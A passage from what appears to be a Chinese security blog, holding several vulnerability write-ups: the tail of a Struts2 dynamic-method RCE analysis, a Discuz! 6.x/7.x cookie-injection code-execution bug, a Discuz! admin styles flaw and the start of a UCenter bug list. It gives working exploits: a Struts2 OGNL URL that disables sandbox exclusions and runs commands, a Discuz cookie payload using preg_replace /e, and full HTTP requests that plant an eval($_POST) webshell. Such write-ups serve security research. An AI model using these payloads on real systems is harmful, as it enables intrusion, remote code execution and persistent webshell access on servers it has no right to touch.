+<p>我们可以看到methodName被带入到getValue了，熟悉Struts相关漏洞的朋友应该都明白这是什么意思，虽然后面被强制添加了一对圆括号，但是想办法语法补齐就好了。相对应的我们来看下在2.3.18版本之前的代码是怎么处理methodName的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">invokeAction</span><span class="params">(Object action, ActionConfig actionConfig)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String methodName = proxy.getMethod();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">"Executing action method = #0"</span>, methodName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    String timerKey = <span class="string">"invokeAction: "</span> + proxy.getActionName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        UtilTimerStack.push(timerKey);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">boolean</span> methodCalled = <span class="keyword">false</span>;</span><br><span class="line">        Object methodResult = <span class="keyword">null</span>;</span><br><span class="line">        Method method = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method = getAction().getClass().getMethod(methodName, EMPTY_CLASS_ARRAY);</span><br></pre></td></tr></table></figure>
+
+<p>在这里使用的是反射，所以在这个漏洞发布的时候，我曾一瞬间觉得又是一个骗CVE的鸡肋，但是事实上，这是一个威胁很大的漏洞。但是官方说的受影响版本<code>Struts 2.0.0 - Struts Struts 2.3.28 (except 2.3.20.2 and 2.3.24.2)</code>是不严谨的，应该是<code>2.3.18-2.3.28(except 2.3.20.2 and 2.3.24.2)</code>。</p>
+<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>利用方式主要难点在于两个地方，一个是上文提到的对于表达式最后的圆括号给予正确的表达式意义。另一个就是在传输过程中method会经过一次转义，双引号和单引号的没有办法使用了，所以需要找到一个绕过。剩下的就是原来套沙盒绕过，命令执行的那套东西了。</p>
+<p>对于圆括号，可以直接使用<code>new java.lang.String</code>这样来拼接成<code>new java.lang.String()</code>构成正确Ognl语法。</p>
+<p>至于不能使用引号的话，命令执行我们可以使用引用参数的方法来完成对字符串的提取，例如：使用#parameters.cmd来提取http的cmd参数。测试PoC如下：</p>
+<blockquote>
+<p><a href="http://172.16.107.143:8080/Struts2_3_18/hello.action?cmd=gedit&amp;method:(%23_memberAccess).setExcludedClasses(@java.util.Collections@EMPTY_SET),(%23_memberAccess).setExcludedPackageNamePatterns(@java.util.Collections@EMPTY_SET),%23cmd%3d%23parameters.cmd,%23a%3dnew%20java.lang.ProcessBuilder(%23cmd).start().getInputStream(),new" target="_blank" rel="noopener">http://172.16.107.143:8080/Struts2_3_18/hello.action?cmd=gedit&amp;method:(%23_memberAccess).setExcludedClasses(@java.util.Collections@EMPTY_SET),(%23_memberAccess).setExcludedPackageNamePatterns(@java.util.Collections@EMPTY_SET),%23cmd%3d%23parameters.cmd,%23a%3dnew%20java.lang.ProcessBuilder(%23cmd).start().getInputStream(),new</a> java.lang.String</p>
+</blockquote>
+<p>效果如下图所示：</p>
+<p><img src="http://static.wooyun.org//drops/20160426/2016042610071333528.png" alt=""></p>
+<p>这里我小小的猜测一下，官方发布的日期是20，而漏洞提交team做宣传是在4月25日，那么是不是在提交CVE时还没有完成弹计算器的利用，还是为了符合漏洞提交规范做的延时？小八卦一下O(∩_∩)O。</p>
+<h1 id="0x03-漏洞总结"><a href="#0x03-漏洞总结" class="headerlink" title="0x03 漏洞总结"></a>0x03 漏洞总结</h1><p>虽然现在CVE已经发布，但是从目前网络情况上（twitter和微博）来看，并没有安全研究人员关注到这两个CVE，可能是因为官方发布过太多鸡肋的CVE了，国内的各路炒洞高手已经对Struts2麻木了。所以目前的情况是属于漏洞存在那里，发了CVE，但是没有任何人去研究利用，发布相关分析。这个漏洞和Struts2前N次被炒的热热闹闹的漏洞影响和危害相比，真是不可同日而语，这个漏洞真的很实在。</p>
+<p>看到这里，打算磨拳擦掌要去调回显PoC的朋友们，这里我要在提醒一次。虽然我在之前说了存在这个问题的站点很多，但是这个漏洞存在版本限制，在Struts2.3.18及其以上的版本才可以触发。而国内大多数的站点由于Struts在2.3.16之后再也没有出现过大的问题，所以绝大多数停留在2.3.16这个版本，这让这个看似很不错的漏洞略显鸡肋了。</p>
+<p><strong>防护方案</strong></p>
+<p>目前官方已经推出了<code>2.3.20.2、2.3.24.2</code>和<code>2.3.28.1</code>修复了这个问题，大家可以针对自己所使用的版本进行升级。下载地址：<a href="https://struts.apache.org/download.cgi#struts23281" target="_blank" rel="noopener">https://struts.apache.org/download.cgi#struts23281</a></p>
+<blockquote>
+<p>转自乌云：<br><a href="http://drops.wooyun.org/papers/15430" target="_blank" rel="noopener">http://drops.wooyun.org/papers/15430</a></p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-discuz-6.x-7.x-REC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-discuz-6.x-7.x-REC/" class="post-title-link" itemprop="url">Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:54:00" itemprop="dateCreated datePublished" datetime="2016-05-14T00:54:00+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:30:17" itemprop="dateModified" datetime="2019-07-25T14:30:17+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-discuz-6.x-7.x-REC/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-discuz-6.x-7.x-REC/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h2 id="Discuz-6-x-7-x-版本-前台任意代码执行漏洞"><a href="#Discuz-6-x-7-x-版本-前台任意代码执行漏洞" class="headerlink" title="Discuz! 6.x-7.x 版本 前台任意代码执行漏洞"></a>Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</h2><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。</p>
+<p>include/global.func.php代码里：</p>
+<pre><code>&lt;code id=&quot;code0&quot;&gt;function daddslashes($string, $force = 0) {
+        !defined(&apos;MAGIC_QUOTES_GPC&apos;) &amp;&amp; define(&apos;MAGIC_QUOTES_GPC&apos;, get_magic_quotes_gpc());
+        if(!MAGIC_QUOTES_GPC || $force) {
+                if(is_array($string)) {
+                        foreach($string as $key =&gt; $val) {
+                                $string[$key] = daddslashes($val, $force);
+                        }
+                } else {
+                        $string = addslashes($string);
+                }
+        }
+        return $string;
+}&lt;/code&gt;</code></pre><p>include/common.inc.php里：</p>
+<pre><code>foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) {
+        foreach($$_request as $_key =&gt; $_value) {
+                $_key{0} != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value);//变量引入000111222
+        }
+}</code></pre><p>模拟register_globals功能的代码,在GPC为off时会调用addslashes()函数处理变量值,但是如果直接使用$_GET/$_POST/$_COOKIE这样的变量,这个就不起作用了,然而dz的源码里直接使用$_GET/$_POST/$_COOKIE的地方很少,存在漏洞的地方更加少:(</p>
+<p>不过还有其他的绕过方法,在register_globals=on下通过提交GLOBALS变量就可以绕过上面的代码了.为了防止这种情况,dz中有如下代码:</p>
+<pre><code>if (isset($_REQUEST[&apos;GLOBALS&apos;]) OR isset($_FILES[&apos;GLOBALS&apos;])) {
+        exit(&apos;Request tainting attempted.&apos;);
+}</code></pre><p>这样就没法提交GLOBALS变量了么？</p>
+<p>$_REQUEST这个超全局变量的值受php.ini中request_order的影响,在最新的php5.3.x系列中,request_order默认值为GP,也就是说默认配置下$_REQUEST只包含$_GET和$_POST,而不包括$_COOKIE,那么我们就可以通过COOKIE来提交GLOBALS变量了:)</p>
+<h1 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h1><p>include/discuzcode.func.php</p>
+<pre><code>function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = &apos;0&apos;, $authorid = &apos;0&apos;, $allowmediacode = &apos;0&apos;, $pid = 0) {
+        global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;
+        if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, &apos;[ /code]&apos;) || strpos($message, &apos;[ /CODE]&apos;)) !== FALSE) {
+                $message = preg_replace(&quot;/\s?\[code\](.+?)\[\/code\]\s?/ies&quot;, &quot;codedisp(&apos;\\1&apos;)&quot;, $message);
+        }
+        $msglower = strtolower($message);
+        //$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;
+        if(!$htmlon) {
+                $message = $jammer ? preg_replace(&quot;/\r\n|\n|\r/e&quot;, &quot;jammer()&quot;, dhtmlspecialchars($message)) : dhtmlspecialchars($message);
+        }
+        if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;]) &amp;&amp; is_array($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;])) {
+                if(!$discuzcodes[&apos;smiliesreplaced&apos;]) {
+                        foreach($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;] AS $key =&gt; $smiley) {
+                                $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;][$key] = &apos;&lt;img src=&quot;images/smilies/&apos;.$GLOBALS[&apos;_DCACHE&apos;][&apos;smileytypes&apos;][$GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;typearray&apos;][$key]][&apos;directory&apos;].&apos;/&apos;.$smiley.&apos;&quot; smilieid=&quot;&apos;.$key.&apos;&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;&apos;;
+                        }
+                        $discuzcodes[&apos;smiliesreplaced&apos;] = 1;
+                }
+        $message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);
+        }
+        ......</code></pre><p>119行 ：</p>
+<pre><code>$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);  //让 preg_replace 加上/e 修正符，产生代码执行</code></pre><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>访问一个存在的帖子，需要访问的页面有表情。<br>例如：<a href="http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1" target="_blank" rel="noopener">http://192.168.0.222/bbs/viewthread.php?tid=12&amp;extra=page%3D1</a><br>然后刷新帖子，拦截数据包，cookie中添加</p>
+<pre><code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code></pre><p>如有漏洞，即可看到效果.<br>写个shell 自然也不是问题了~</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><img src="https://www.t00ls.net/attachments/month_1411/1411232121316afb1fac2c2397.jpg" alt=""></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-discuz-admin_styles.inc.php-get-webshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-discuz-admin_styles.inc.php-get-webshell/" class="post-title-link" itemprop="url">Discuz! admin_styles.inc.php get-webshell bug</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:53:06" itemprop="dateCreated datePublished" datetime="2016-05-14T00:53:06+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:30:04" itemprop="dateModified" datetime="2019-07-25T14:30:04+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-discuz-admin_styles.inc.php-get-webshell/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-discuz-admin_styles.inc.php-get-webshell/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h1 id="Discuz-admin-styles-inc-php-get-webshell-bug"><a href="#Discuz-admin-styles-inc-php-get-webshell-bug" class="headerlink" title="Discuz! admin_styles.inc.php get-webshell bug"></a>Discuz! admin_styles.inc.php get-webshell bug</h1><pre><code>author: ring04h
+team:http://www.80vul.com</code></pre><p>由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞.</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>在文件admin\styles.inc.php里代码:</p>
+<pre><code>if($newcvar &amp;&amp; $newcsubst) {
+    if($db-&gt;result_first(&quot;SELECT COUNT(*) FROM {$tablepre}stylevars WHERE variable=&apos;$newcvar&apos; AND styleid=&apos;$id&apos;&quot;)) {
+        cpmsg(&apos;styles_edit_variable_duplicate&apos;, &apos;&apos;, &apos;error&apos;);
+    } elseif(!preg_match(&quot;/[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*/&quot;, $newcvar)) {
+        cpmsg(&apos;styles_edit_variable_illegal&apos;, &apos;&apos;, &apos;error&apos;);
+    }
+    $newcvar = strtolower($newcvar);
+    $db-&gt;query(&quot;INSERT INTO {$tablepre}stylevars (styleid, variable, substitute)
+        VALUES (&apos;$id&apos;, &apos;$newcvar&apos;, &apos;$newcsubst&apos;)&quot;);
+}</code></pre><p>上面代码可以看出来当有后台权限时,可通过编辑风格,自定义模板变量处插入</p>
+<pre><code>&lt;strong&gt; !&apos;,&apos;80VUL&apos;);EVAL(
+___FCKpd___0
+
+POST[RING]);// &lt;/strong&gt;</code></pre><p>替换出插入 exp by ring04h!，远程写入webshell执行代码.</p>
+<h1 id="利用POC"><a href="#利用POC" class="headerlink" title="利用POC"></a>利用POC</h1><p>step1：</p>
+<pre><code>POST /bbs/admincp.php?action=styles HTTP/1.1
+Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/vnd.ms-xpsdocument, application/xaml+xml, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.80vul.com/bbs/admincp.php?action=styles
+Accept-Language: zh-cn
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Host: www.80vul.com
+Content-Length: 154
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: 
+
+formhash=99238f2d&amp;anchor=&amp;updatecsscache=0&amp;namenew%5B1%5D=%C4%AC%C8%CF%B7%E7%B8%F1&amp;availablenew%5B1%5D=1&amp;defaultnew=1&amp;newname=exp&amp;stylesubmit=%CC%E1%BD%BB</code></pre><p>step2:</p>
+<pre><code>POST /bbs/admincp.php?action=styles&amp;operation=edit&amp;id=6 HTTP/1.1
+Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/vnd.ms-xpsdocument, application/xaml+xml, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.80vul.com/bbs/admincp.php?action=styles&amp;operation=edit&amp;id=6
+Accept-Language: zh-cn
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Host: www.80vul.com
+Content-Length: 1402
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: 
+
+formhash=99238f2d&amp;anchor=&amp;namenew=exp&amp;templateidnew=1&amp;stylevar%5B249%5D=1&amp;stylevar%5B247%5D=&amp;stylevar%5B248%5D=&amp;stylevar%5B246%5D=&amp;stylevar%5B250%5D=&amp;stylevarbgimg%5B250%5D=&amp;stylevarbgextra%5B250%5D=&amp;stylevar%5B251%5D=&amp;stylevarbgimg%5B251%5D=&amp;stylevarbgextra%5B251%5D=&amp;stylevar%5B252%5D=&amp;stylevarbgimg%5B252%5D=&amp;stylevarbgextra%5B252%5D=&amp;stylevar%5B253%5D=&amp;stylevar%5B254%5D=&amp;stylevar%5B255%5D=&amp;stylevar%5B256%5D=&amp;stylevar%5B257%5D=&amp;stylevar%5B258%5D=&amp;stylevar%5B259%5D=&amp;stylevar%5B260%5D=&amp;stylevar%5B261%5D=&amp;stylevar%5B262%5D=&amp;stylevar%5B263%5D=&amp;stylevar%5B264%5D=&amp;stylevar%5B265%5D=&amp;stylevar%5B266%5D=&amp;stylevar%5B267%5D=&amp;stylevar%5B268%5D=&amp;stylevar%5B269%5D=&amp;stylevar%5B270%5D=&amp;stylevar%5B271%5D=&amp;stylevar%5B272%5D=&amp;stylevar%5B273%5D=&amp;stylevar%5B274%5D=&amp;stylevar%5B275%5D=&amp;stylevarbgimg%5B275%5D=&amp;stylevarbgextra%5B275%5D=&amp;stylevar%5B276%5D=&amp;stylevar%5B277%5D=&amp;stylevar%5B278%5D=&amp;stylevar%5B279%5D=&amp;stylevar%5B280%5D=&amp;stylevar%5B281%5D=&amp;stylevar%5B282%5D=&amp;stylevar%5B283%5D=&amp;stylevarbgimg%5B283%5D=&amp;stylevarbgextra%5B283%5D=&amp;stylevar%5B284%5D=&amp;stylevarbgimg%5B284%5D=&amp;stylevarbgextra%5B284%5D=&amp;stylevar%5B285%5D=&amp;stylevarbgimg%5B285%5D=&amp;stylevarbgextra%5B285%5D=&amp;stylevar%5B286%5D=&amp;stylevar%5B287%5D=&amp;stylevar%5B288%5D=&amp;stylevar%5B289%5D=&amp;stylevar%5B290%5D=&amp;stylevar%5B291%5D=&amp;newcvar=%21%27%2C%2780vul%27%29%3Beval%28%24_post%5Bring%5D%29%3B%2F%2F&amp;newcsubst=exp+by+ring04h%21&amp;editsubmit=%CC%E1%BD%BB</code></pre><p>webshell:</p>
+<pre><code>http://www.80vul.com/bbs/forumdata/cache/style_6.php </code></pre>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-ucenter-bug-list/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/2016-05-14-ucenter-bug-list/" class="post-title-link" itemprop="url">Ucenter vuls list</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:51:04" itemprop="dateCreated datePublished" datetime="2016-05-14T00:51:04+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:26:35" itemprop="dateModified" datetime="2019-07-25T14:26:35+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-ucenter-bug-list/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-ucenter-bug-list/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<ol>
+<li><p>暴力破解创始人密码</p>
+<p> 漏洞文件:<code>/control/app.php:34:onadd</code></p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onadd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$ucfounderpw = getgpc(<span class="string">'ucfounderpw'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$apptype = getgpc(<span class="string">'apptype'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appname = getgpc(<span class="string">'appname'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appurl = getgpc(<span class="string">'appurl'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appip = getgpc(<span class="string">'appip'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$viewprourl = getgpc(<span class="string">'viewprourl'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appcharset = getgpc(<span class="string">'appcharset'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appdbcharset = getgpc(<span class="string">'appdbcharset'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$apptagtemplates = getgpc(<span class="string">'apptagtemplates'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appallowips = getgpc(<span class="string">'allowips'</span>, <span class="string">'P'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(md5(md5($ucfounderpw).UC_FOUNDERSALT) == UC_FOUNDERPW || (strlen($ucfounderpw) == <span class="number">32</span> &amp;amp;&amp;amp; $ucfounderpw == md5(UC_FOUNDERPW))) &#123;</span><br><span class="line">		@ob_start();</span><br><span class="line">		$return  = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">		$app = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;fetch_first(&amp;quot;SELECT * FROM &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications WHERE url=<span class="string">'$appurl'</span> <span class="keyword">AND</span> type=<span class="string">'$apptype'</span>&amp;quot;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($app)) &#123;</span><br><span class="line">			$authkey = <span class="keyword">$this</span>-&amp;gt;_generate_key();</span><br><span class="line">			$apptagtemplates = <span class="keyword">$this</span>-&amp;gt;serialize($apptagtemplates, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;db-&amp;gt;query(&amp;quot;INSERT INTO &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications SET</span><br><span class="line">				name=<span class="string">'$appname'</span>,</span><br><span class="line">				url=<span class="string">'$appurl'</span>,</span><br><span class="line">				ip=<span class="string">'$appip'</span>,</span><br><span class="line">				authkey=<span class="string">'$authkey'</span>,</span><br><span class="line">				viewprourl=<span class="string">'$viewprourl'</span>,</span><br><span class="line">				synlogin=<span class="string">'1'</span>,</span><br><span class="line">				charset=<span class="string">'$appcharset'</span>,</span><br><span class="line">				dbcharset=<span class="string">'$appdbcharset'</span>,</span><br><span class="line">				type=<span class="string">'$apptype'</span>,</span><br><span class="line">				recvnote=<span class="string">'1'</span>,</span><br><span class="line">				tagtemplates=<span class="string">'$apptagtemplates'</span>,</span><br><span class="line">				allowips=<span class="string">'$appallowips'</span></span><br><span class="line">				&amp;quot;);</span><br><span class="line">			$appid = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;insert_id();</span><br><span class="line"></span><br><span class="line">			$_ENV[<span class="string">'app'</span>]-&amp;gt;alter_app_table($appid, <span class="string">'ADD'</span>);</span><br><span class="line">			<span class="comment">//$return = &amp;quot;UC_STATUS_OK|$authkey|$appid|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span></span><br><span class="line">			$return = &amp;quot;$authkey|$appid|&amp;quot;.UC_DBHOST.<span class="string">'|'</span>.UC_DBNAME.<span class="string">'|'</span>.UC_DBUSER.<span class="string">'|'</span>.UC_DBPW.<span class="string">'|'</span>.UC_DBCHARSET.<span class="string">'|'</span>.UC_DBTABLEPRE.<span class="string">'|'</span>.UC_CHARSET;</span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;load(<span class="string">'cache'</span>);</span><br><span class="line">			